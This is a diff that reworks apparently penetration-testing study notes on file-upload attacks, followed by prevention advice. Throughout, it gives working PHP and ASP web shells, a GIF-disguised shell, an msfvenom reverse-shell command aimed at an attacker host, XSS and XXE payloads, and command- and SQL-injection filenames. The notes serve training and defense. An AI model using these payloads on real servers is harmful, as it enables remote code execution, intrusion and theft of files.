@@ -1,131 +1,162 @@
 # File Upload Attacks
 
-File upload vulns come from weak or missing validation of uploaded files. Worst case is an unauthenticated arbitrary file upload — any user, any file type, one step from code execution. Even non-arbitrary uploads (specific types only) can introduce XSS/XXE, DoS, or overwrite critical files if protections are missing. Outdated libraries cause these as often as insecure code.
+## Intro to File Upload Attacks
+
+### Types of File Upload Attacks
+
+Unauthenticated arbitrary file upload (any file type, no auth needed) is the worst case and usually leads to RCE via a web shell or reverse shell. Even limited uploads (specific types only) can enable XSS, XXE, DoS, or file overwrites.
 
 ## Absent Validation
 
-No validation filters at all → upload a web shell or reverse shell script directly and visit its link. Tell-tale signs: the form mentions no allowed types, accepts any drag-and-dropped file (.php included), and the file selector says "All Files".
+No validation filter on uploads lets any file type through, including executable scripts.
 
-**Identify the framework first** — a web shell must be written in the language running the server (it calls platform-specific functions; not cross-platform). URL extensions usually give it away, but Web Routes frameworks hide them — and then uploaded files may not be directly routable either. Fallbacks:
+### Identifying Web Framework
 
-- Visit `/index.ext` swapping in common extensions (php, asp, aspx, ...) — `http://<SERVER_IP>:<PORT>/index.php` returning the index page confirms PHP. Fuzz it with Burp Intruder + a Web Extensions wordlist instead of doing it manually. Not foolproof: some apps use no index page or multiple extensions.
-- Wappalyzer browser extension — reveals language, web server + version, back-end OS, other technologies.
-- Burp/ZAP scanners.
+Web shells must match the server's language. Find it by visiting `/index.<ext>` for common extensions (php, asp, aspx) or fuzzing with Burp Intruder using a Web Extensions wordlist. Wappalyzer browser extension also IDs the stack.
 
-**Confirm execution** — write `<?php echo "Hello HTB";?>` to test.php, upload, visit `/uploads/test.php`. Message renders → PHP executed. Source code printed instead → no code execution.
+### Vulnerability Identification
+
+Upload a basic test file in the detected language to confirm code execution before exploiting further.
+
+```php
+<?php echo "Hello HTB";?>
+```
+
+If the output renders instead of raw source, the server executes the uploaded file.
 
 ## Upload Exploitation
 
-**Web shells**: phpbash gives a terminal-like semi-interactive PHP shell. SecLists ships a pile of shells for many languages in its `/Web-Shells/` directory. Upload, visit the link, enumerate.
+Upload a web shell or reverse shell in the server's language to gain code execution after confirming arbitrary upload.
 
-**Write your own** — may be the only option on engagements without internet access:
+### Web Shells
+
+phpbash gives a semi-interactive terminal-like PHP web shell. SecLists has web shells for many languages (Web-Shells directory).
+
+### Writing Custom Web Shell
+
+Minimal web shell executing commands via a GET parameter.
 
 ```php
 <?php system($_REQUEST['cmd']); ?>
 ```
 
-Interact via `?cmd=id`. View output through source-view (CTRL+U) to escape HTML rendering that mangles formatting. .NET equivalent:
+Call with `?cmd=id`. View via browser source (CTRL+U) to avoid HTML-rendered output.
 
-```asp
+```vbscript
 <% eval request('cmd') %>
 ```
 
-Web shells can fail when the server blocks the functions they use (e.g. `system()`) or a WAF interferes.
+.NET equivalent, same `?cmd=` usage. May fail if `system()` is disabled or a WAF blocks it.
 
-**Reverse shell**: pentestmonkey PHP reverse shell is reliable; SecLists also carries reverse shell scripts per language. Edit the IP/port lines in the script:
+### Reverse Shell
 
-```php
-$ip = '<ATTACKER_IP>';     // CHANGE THIS
-$port = <LISTENING_PORT>;  // CHANGE THIS
-```
-
-Then listen, upload, visit the link:
+pentestmonkey PHP reverse shell (or any SecLists reverse shell script) connects back to a listener after upload. Edit the IP/port in the script, then catch with:
 
 ```bash
-nc -lvnp <LISTENING_PORT>
+nc -lvnp <PORT>
 ```
 
-**Generate with msfvenom** — core framework functions beat unreliable command reverse shells, and msfvenom may bypass restrictions in place:
+Reverse shells are preferred over web shells but may fail if outbound traffic is blocked or needed functions are disabled.
+
+### Generating Custom Reverse Shell Scripts
+
+msfvenom generates reverse shell payloads in many languages.
 
 ```bash
-msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<LISTENING_PORT> -f raw > reverse.php
+msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.php
 ```
 
-Other languages: swap the `-p` payload and `-f` output format. Reverse shells are preferred but not guaranteed — egress firewalling or disabled functions can force you back to a web shell.
+`-p` payload | `-f` output format
+
+Upload the generated script and catch with the same listener.
 
 ## Client-Side Validation
 
-Front-end-only validation is fully under our control — the code executes in our browser. Tell: the page never refreshes or sends any HTTP request after selecting a file, so everything happens client-side. Two bypass routes: modify the upload request, or neuter the front-end code.
+Front-end-only type checks are bypassed by sending requests directly or editing client-side code. No refresh or new request after picking a bad file signals client-side-only validation.
 
-**Back-end request modification** — capture the upload POST in Burp. The two parts that matter are `filename="HTB.png"` and the file content at the end. Change filename to `shell.php`, swap the content for the web shell, forward. If the back-end does no validation of its own, it uploads and executes. (The file's Content-Type can also be changed, but doesn't matter at this stage.)
+### Back-end Request Modification
 
-**Disabling front-end validation** — CTRL+SHIFT+C opens the Page Inspector; clicking the upload element highlights the input:
+Capture the upload request in Burp and change the filename (e.g. `shell.php`) and body content to a web shell, bypassing front-end-only checks.
+
+### Disabling Front-end Validation
+
+Inspect element (CTRL+SHIFT+C) on the upload input to find the validation attributes, then use console (CTRL+SHIFT+K) to view the handler function.
 
 ```html
 <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
 ```
 
-The `accept` attribute only filters the selection dialog — ignore it. The real check is `onchange="checkFile(this)"`. Pull its source from the Console (CTRL+SHIFT+K, type the function name) to confirm it's the validator, then just double-click the function name in the inspector and delete it — no JS editing needed. Upload the shell normally afterward. The edit is client-side and temporary, which is all we need. (Firefox flow; Chrome uses overrides.) Finding the uploaded path afterward: refresh, inspector, read the `<img src="/profile_images/shell.php">` URL.
+Delete the `onchange="checkFile(this)"` attribute (and `accept=...` if needed) in the inspector to disable client-side extension checking, then upload the shell normally. Change is temporary and resets on refresh.
 
 ## Blacklist Filters
 
-Back-end validation kicks in when the Burp-modified request returns `Extension not allowed`. Extension validation comes in two flavors — blacklist (weakest) and whitelist — plus content/type checks. Blacklist flaw: never comprehensive.
+Back-end denies specific extensions; incomplete lists let disallowed types execute via unlisted extensions.
+
+### Blacklisting Extensions
 
 ```php
 $fileName = basename($_FILES["uploadFile"]["name"]);
 $extension = pathinfo($fileName, PATHINFO_EXTENSION);
 $blacklist = array('php', 'php7', 'phps');
-
 if (in_array($extension, $blacklist)) {
     echo "File type not allowed";
     die();
 }
 ```
 
-Also case-sensitive, lowercase only — on Windows (case-insensitive filenames) a mixed-case `pHp` may slip through and still execute.
+Comparison is often case-sensitive and lowercase-only. On Windows, mixed case (e.g. `pHp`) can bypass it and still execute.
 
-**Fuzzing extensions**: PayloadsAllTheThings has PHP and .NET extension lists; SecLists has a common Web Extensions list. In Burp: grab the last `/upload.php` request from History → Send to Intruder → Clear positions → select just the extension in `filename="HTB.php"` → Add. Load the extensions list as payloads and un-tick URL Encoding so the `.` isn't encoded. Sort results by Length — responses matching the "File successfully uploaded" size passed validation; the rest errored.
+### Fuzzing Extensions
 
-**Non-blacklisted extensions**: not every allowed extension executes on every server config — try several. `.phtml` is the usual winner (PHP web servers often grant it execution rights). Upload the web shell as `shell.phtml`, visit `/profile_images/shell.phtml?cmd=id`.
+Fuzz the upload extension with PayloadsAllTheThings' PHP/.NET extension lists or SecLists' Web Extensions wordlist. In Burp Intruder, set the extension as the payload position, disable URL-encoding of `.`, and compare response length/message to find extensions not blocked.
+
+### Non-Blacklisted Extensions
+
+`.phtml` often still executes as PHP on many servers and is commonly missed by blacklists.
 
 ## Whitelist Filters
 
-Whitelists only allow listed extensions and don't need to be comprehensive — more secure, but same use-case split: blacklists fit wide-range upload features (file managers), whitelists fit narrow ones (profile images). Often used together. Fuzz with the same extension list to map what's allowed; error text ("Only images are allowed") doesn't reveal which validation type is in play.
+Only listed extensions pass. More secure than blacklisting but still bypassable through regex flaws.
 
-The classic whitelist bug — regex checks the extension exists *anywhere* in the filename, not that the file *ends* with it:
+### Whitelisting Extensions
+
+Checks if the filename contains an allowed extension anywhere, not that it ends with it.
 
 ```php
 $fileName = basename($_FILES["uploadFile"]["name"]);
-
 if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
     echo "Only images are allowed";
     die();
 }
 ```
 
-**Double Extensions** — `shell.jpg.php` satisfies "contains .jpg" and still ends in .php. Upload via Burp, execute at `/profile_images/shell.jpg.php?cmd=id`. Blocked by a strict regex that anchors the end:
+### Double Extensions
+
+Add a whitelisted extension before the real one, e.g. `shell.jpg.php`, to pass a non-anchored regex while still executing as PHP. A strict pattern anchored with `$` blocks this:
 
 ```php
 if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 ```
 
-**Reverse Double Extension** — the upload code may be solid while the *web server config* is the vuln. Apache's `/etc/apache2/mods-enabled/php7.4.conf` decides what executes PHP:
+### Reverse Double Extension
 
-```xml
+Apache's handler regex can also lack an end anchor, so a name like `shell.php.jpg` passes a strict filename whitelist (ends in `.jpg`) but still matches the handler and executes as PHP.
+
+```text
 <FilesMatch ".+\.ph(ar|p|tml)">
     SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 
-Same missing-`$` mistake: any filename *containing* .phar/.php/.phtml gets PHP execution rights. So `shell.php.jpg` passes the app's strict whitelist (ends in .jpg) and still executes through the misconfiguration.
+Config typically at `/etc/apache2/mods-enabled/php7.4.conf`.
 
-**Character Injection** — inject characters before/after the final extension to make the app misinterpret the filename:
+### Character Injection
 
-```text
-%20  %0a  %00  %0d0a  /  .\  .  …  :
-```
+Inject characters before/after the extension to make the server misinterpret the filename while the whitelist still matches.
 
-Examples: `shell.php%00.jpg` on PHP 5.X and earlier (filename ends at the null byte, stored as shell.php); `shell.aspx:.jpg` on Windows (colon trick, written as shell.aspx). Generate all permutations for fuzzing:
+Characters to try: `%20` `%0a` `%00` `%0d0a` `/` `.\` `.` `…` `:`
+
+`shell.php%00.jpg` truncates at the null byte on PHP <= 5.x, saving as `shell.php`. On Windows, a colon before the extension (`shell.aspx:.jpg`) saves as `shell.aspx`.
 
 ```bash
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
@@ -138,80 +169,60 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
 done
 ```
 
-Fuzz the filename position in Intruder with the generated wordlist — hits depend on outdated back-ends or server misconfigs.
-
 ## Type Filters
 
-Extension checks alone aren't enough (shell.php.jpg proved it), so modern apps also validate content. Content filters check a category (images/videos/documents), not a list — two methods: Content-Type header and file content.
+Validates file content instead of name, via Content-Type header or MIME magic bytes, usually limited to one category.
 
-Fingerprint: `Only images are allowed` persists no matter what — `shell.jpg.phtml`, `shell.php.jpg`, even `shell.jpg` containing a web shell all fail → the app is checking content, not names.
+### Content-Type
 
-**Content-Type** — browser sets this header from the file extension, i.e. client-side, i.e. controllable:
+Server checks the browser-set `Content-Type` header of the uploaded file, attacker-controlled and easy to change in Burp.
 
 ```php
 $type = $_FILES['uploadFile']['type'];
-
 if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
     echo "Only images are allowed";
     die();
 }
 ```
 
-Fuzz allowed types with SecLists' content-type list, filtered down to images first:
+Fuzz allowed types with a SecLists content-type list filtered to the expected category:
 
 ```bash
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
 cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
 ```
 
-(45 image types vs ~700 total.) Then set the file's Content-Type to an allowed one (e.g. `image/jpg`) in Burp and forward — `shell.php` uploads fine. Note: upload requests carry two Content-Type headers — the file's (bottom) and the request's (top). Usually modify the file's; if the content went out as POST data, only the main header exists, so modify that one.
+A multipart upload request has two `Content-Type` headers, one for the whole request and one for the file part. Usually the file part's header needs changing.
 
-**MIME-Type** — the more common check: inspect the file's first bytes (magic bytes / signature). `GIF87a`/`GIF89a` = GIF; plaintext = text file. GIF is the easiest signature to imitate — most image types use non-printable bytes, but `GIF8` is ASCII and common to both GIF variants:
+### MIME-Type
 
-```bash
-echo "this is a text file" > text.jpg
-file text.jpg    # ASCII text
-echo "GIF8" > text.jpg
-file text.jpg    # GIF image data
-```
-
-Server-side check:
+Server reads the file's magic bytes (first few bytes) via `mime_content_type()` instead of trusting the extension or header.
 
 ```php
 $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
-
 if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
     echo "Only images are allowed";
     die();
 }
 ```
 
-Bypass when Content-Type + MIME are both checked: prepend `GIF8` to the web shell and keep the `.php` extension — file passes as a GIF by content, executes as PHP by name:
-
-```php
-GIF8<?php system($_REQUEST['cmd']); ?>
-```
-
-(The `GIF8` prints before the command output — expected.) Mix and match layers to confuse robust filters: allowed MIME + disallowed Content-Type, allowed content + disallowed extension, and so on.
+Prepend `GIF8` (GIF magic bytes, printable ASCII, easiest to fake) as the first line of the PHP shell, keep the `.php` extension. Output then starts with `GIF8` before the command result. Combine Content-Type + MIME filters for extra bypass attempts: allowed MIME with disallowed Content-Type/extension or vice versa.
 
 ## Limited File Uploads
 
-Even a properly locked-down upload form is attack surface — SVG, HTML, XML, and some image/document types can carry secondary attacks. Which is exactly why fuzzing allowed extensions matters: it maps what's achievable.
+Even with strict extension/content filters, allowed types like SVG, HTML, XML, images, or docs can enable other attacks.
 
-**XSS**:
-- HTML uploads: no code execution, but embedded JavaScript runs on anyone who visits the uploaded page — XSS/CSRF from a trusted domain.
-- Apps that display image metadata: inject the payload into a raw-text metadata field (Comment, Artist) with exiftool:
+### XSS
+
+HTML file uploads allow stored XSS/CSRF via embedded JavaScript when viewed. Image metadata fields (e.g. Comment) displayed back to users can carry XSS too:
 
 ```bash
 exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
-exiftool HTB.jpg
 ```
 
-Changing the image's MIME-Type to `text/html` can also get some apps to render it as a document, firing the payload even without metadata display.
+SVG is XML-based and can embed a `<script>` tag that runs when the image renders:
 
-- SVG (XML-based): embed a script directly:
-
-```xml
+```text
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
@@ -220,34 +231,43 @@ Changing the image's MIME-Type to `text/html` can also get some apps to render i
 </svg>
 ```
 
-**XXE** — SVG (or any displayed XML upload) can leak local files:
+Changing an image's MIME type to `text/html` can make some apps render it as HTML, triggering the payload even without displayed metadata.
 
-```xml
+### XXE
+
+SVG and other XML-based uploads (PDF, Word, PowerPoint) can carry XXE if the viewer parses XML insecurely.
+
+```text
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
 ```
 
-More valuable: read the app's own source for whitebox testing — upload dir location, allowed extensions, naming scheme. PHP source via the filter wrapper:
+Read PHP source with the filter wrapper:
 
-```xml
+```text
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <svg>&xxe;</svg>
 ```
 
-PDF/Word/PowerPoint all embed XML structure — an XXE-vulnerable document viewer plus these uploads = blind XXE, and the same primitives give SSRF into internal services/private APIs.
+Decode the base64 output to read source. Source access can reveal the upload directory, allowed extensions, and naming scheme. XXE here can also lead to SSRF (enumerate internal services, call internal APIs).
 
-**DoS**:
-- XXE payloads themselves (per the Web Attacks module)
-- Decompression bomb: nested ZIPs inside a ZIP, auto-unzip inflates to petabytes
-- Pixel flood: JPG/PNG with compression data rewritten to `0xffff x 0xffff` (~4 Gigapixels) — display attempts allocate all memory and crash the server
-- Oversized uploads where no size limit exists (fills the disk)
-- Directory traversal in the filename (`../../../etc/passwd`) to write outside the uploads dir
+### DoS
+
+Decompression bomb: nested ZIP archives if the app auto-extracts uploads, expanding to huge sizes.
+
+Pixel flood: a small JPG/PNG (e.g. 500x500) with compression metadata manually edited to claim a size of 0xffff x 0xffff (~4 gigapixels), crashing the server on render/allocation.
+
+Uploading an oversized file can fill disk if size isn't limited. Path traversal in the upload path (e.g. `../../../etc/passwd`) can also crash or overwrite files. XXE payloads can cause DoS as well.
 
 ## Other Upload Attacks
 
-**Injections in file name** — if the filename gets reflected or processed, it's an injection point. OS command injection when the app moves files with shell commands (`mv $file /tmp`):
+Extra techniques for exploiting upload forms or server behavior when content filters can't be bypassed directly.
+
+### Injections in File Name
+
+If the filename is passed to an OS command, JS display, or SQL query unsanitized, injecting into it can lead to command injection, XSS, or SQLi.
 
 ```text
 file$(whoami).jpg
@@ -255,30 +275,51 @@ file`whoami`.jpg
 file.jpg||whoami
 ```
 
-XSS in the name (`<script>alert(window.origin);</script>`) fires when the name is displayed to the target; SQLi in the name (`file';select+sleep(5);--.jpg`) when it lands in a query unescaped.
+Command injection via filename used in an OS command (e.g. `mv`).
 
-**Upload Directory Disclosure** — feedback/submission forms don't show you the uploaded file's link. Find the uploads dir by fuzzing, or chain LFI/XXE to read the source (as above). Force error messages: upload a filename that already exists (or send two identical requests simultaneously — write failure may print the path), or a 5,000-character filename.
+```text
+<script>alert(window.origin);</script>
+```
 
-**Windows-specific attacks**:
-- Reserved characters (`|`, `<`, `>`, `*`, `?`) unsanitized/unquoted may reference other files and error out the path
-- Reserved names (`CON`, `COM1`, `LPT1`, `NUL`) can't be written — forced error, directory disclosure
-- 8.3 short filename convention (still supported): `hackthebox.txt` = `HAC~1.TXT` / `HAC~2.TXT` (digit = order of matching HAC* files). Uploading `WEB~1.CON` overwrites web.conf — file overwrite, info disclosure via errors, DoS, or access to private files.
+XSS if the filename is reflected on a page.
 
-**Advanced** — any automatic processing of uploads (video encoding, compression, renaming) is exploitable if insecurely coded. Known library examples: the AVI upload XXE in ffmpeg. Custom code/libraries need deeper techniques — bug bounty reports are the best source for these.
+```text
+file';select+sleep(5);--.jpg
+```
+
+SQLi if the filename is used in a query.
+
+### Upload Directory Disclosure
+
+When the upload path isn't known, fuzz for it, or use LFI/XXE to read source and find the path, naming scheme, and allowed extensions.
+
+Forcing an error can also leak the path: upload a file with a name that already exists, send two identical upload requests simultaneously, or use an overly long filename (~5000 chars).
+
+### Windows-specific Attacks
+
+Reserved characters (`|`, `<`, `>`, `*`, `?`) in an unsanitized/unquoted filename can reference another file and error out, disclosing the upload path. Reserved names (`CON`, `COM1`, `LPT1`, `NUL`) also cause write errors.
+
+8.3 short filenames let a tilde-numbered name reference or overwrite an existing file, e.g. `WEB~1.CON` can overwrite `web.conf`.
+
+### Advanced File Upload Attacks
+
+Any automatic post-upload processing (video encoding, compression, renaming) can be vulnerable if the library is insecure, e.g. AVI upload leading to XXE in ffmpeg.
 
 ## Preventing File Upload Vulnerabilities
 
-**Extension Validation** — use whitelist *and* blacklist together: the blacklist catches malicious scripts if the whitelist regex is ever bypassed (shell.php.jpg). Blacklist matches the extension anywhere in the filename; whitelist anchors the end with `$`:
+Checklist for securely validating and handling uploads, and recommendations to report after testing.
+
+### Extension Validation
+
+Whitelist allowed extensions and blacklist dangerous ones together for defense in depth. Apply validation on both front-end and back-end.
 
 ```php
 $fileName = basename($_FILES["uploadFile"]["name"]);
-
 // blacklist test
 if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
     echo "Only images are allowed";
     die();
 }
-
 // whitelist test
 if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
     echo "Only images are allowed";
@@ -286,21 +327,19 @@ if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
 }
 ```
 
-Run validation on both back-end and front-end — front-end is bypassable but cuts noise/false alerts from unintended uploads.
+### Content Validation
 
-**Content Validation** — never validate extension without content or vice versa, and the extension must match the content. Check both the HTTP Content-Type and the file signature (MIME):
+Validate extension, Content-Type header, and MIME type together so they must all match the expected file type.
 
 ```php
 $fileName = basename($_FILES["uploadFile"]["name"]);
 $contentType = $_FILES['uploadFile']['type'];
 $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
-
 // whitelist test
 if (!preg_match('/^.*\.png$/', $fileName)) {
     echo "Only PNG images are allowed";
     die();
 }
-
 // content test
 foreach (array($contentType, $MIMEtype) as $type) {
     if (!in_array($type, array('image/png'))) {
@@ -310,17 +349,19 @@ foreach (array($contentType, $MIMEtype) as $type) {
 }
 ```
 
-**Upload Disclosure** — hide the uploads directory; serve downloads through a download.php script instead of direct links. The script needs strict authorization checks (file owned by/accessible to the authenticated user — IDOR defense) and path validation (no unsanitized input in file paths, strict allowlist of files/dirs — LFI defense). Direct requests to the uploads dir should 403. Serve files with:
+### Upload Disclosure
 
-- `Content-Disposition: attachment` — download instead of inline render
-- `Content-Type` — correct MIME so the browser handles content properly
-- `X-Content-Type-Options: nosniff` — no MIME sniffing
+Hide the uploads directory, serve files only through a controlled download script with authorization and path checks (prevents IDOR/LFI), and return 403 for direct requests to the uploads directory.
 
-Randomize stored filenames, keep sanitized originals in a DB, and map back at download time — users then know neither the directory nor the filenames, and filename injections die too. Store uploads on a separate server/container so RCE compromises only the uploads host. Restrict app file access to its own directories (`open_basedir` in PHP).
+`Content-Disposition: attachment` forces download instead of inline render | `Content-Type` sets correct MIME | `X-Content-Type-Options: nosniff` stops MIME sniffing
 
-**Further Security**:
-- Disable dangerous functions via `disable_functions` in php.ini — `exec`, `shell_exec`, `system`, `passthru`, etc.
-- Suppress system/server errors; handle at app level and print generic messages without filenames, directories, or raw errors
-- Limit file size, update libraries, scan uploads for malware/malicious strings, run a WAF as a secondary layer
+Randomize stored filenames and keep the original name in a database, so users never see the real name or path. Store uploads on a separate server/container to limit blast radius, and restrict file access with `open_basedir`.
 
-These double as the reporting checklist for a pentest — hand developers the gaps.
+### Further Security
+
+Set `disable_functions` in `php.ini` to disable dangerous functions like `exec`, `shell_exec`, `system`, `passthru`. Disable verbose system/server error output.
+
+- Limit file size
+- Keep libraries updated
+- Scan uploads for malware
+- Use a WAF as a secondary layer
